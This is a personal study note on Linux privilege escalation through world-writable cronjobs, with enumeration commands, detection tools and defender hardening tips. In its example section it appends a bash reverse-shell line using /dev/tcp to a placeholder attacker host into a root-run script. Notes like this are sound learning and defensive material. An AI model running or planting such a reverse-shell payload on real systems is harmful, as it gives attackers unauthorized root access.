---
ID: LIX003  
Date: 07/08/2025  
Tags: #linux #privesc #cron #enumeration #persistence  
Category: Linux  
---

# LIX003 – Writable Cronjobs

## 🧠 What I Learned

In Linux, **cronjobs** are scheduled tasks that run automatically at defined intervals. If a cronjob is misconfigured — for example, pointing to a **script or binary a low-privileged user can modify** — it can be exploited to escalate privileges or maintain persistence.

---

## 🔍 Finding Cronjobs

To view system-wide cronjobs:

```bash
cat /etc/crontab  
ls -la /etc/cron*  
crontab -l  
ls -la /var/spool/cron/
```
You’re looking for jobs that:
- Run as **root**
- Point to scripts in **world-writable or user-writable locations**

---

## 💣 Exploitable Example

You find this in `/etc/crontab`:

```bash

* * * * * root /home/dev/backup.sh
```
Then you check:

```bash
ls -la /home/dev/backup.sh  
-rwxrwxrwx 1 dev dev 1234 Jul 5 09:00 backup.sh
```
There it is, world-writable script **run by root every minute**.

Add your payload:

```bash
echo "bash -i >& /dev/tcp/attacker-ip/4444 0>&1" >> /home/dev/backup.sh
```
Wait for cron to run → **root reverse shell lands**.

---

## 🔐 Detection & Enumeration

- Look for `root`-owned jobs running user-controlled scripts
- Check for writable directories like `/opt/`, `/tmp/`, `/home/*/scripts/`
- Use `linpeas.sh`, `les.sh`, or `pspy` to watch for running jobs

---

## 🛡️ Defender Tips

- Never run root cronjobs that point to writable files  
- Use full paths in cron scripts  
- Secure scripts with root-only permissions:

```bash
chmod 700 /root/scripts/backup.sh  
chown root:root /root/scripts/backup.sh
```
---

## 🔗 Resources

- [HackTricks – Writable Cron](https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-cron-jobs)  
- [GTFOBins – Crontab](https://gtfobins.github.io/gtfobins/crontab/)  
- [Linux crontab(5) man page](https://man7.org/linux/man-pages/man5/crontab.5.html)

---
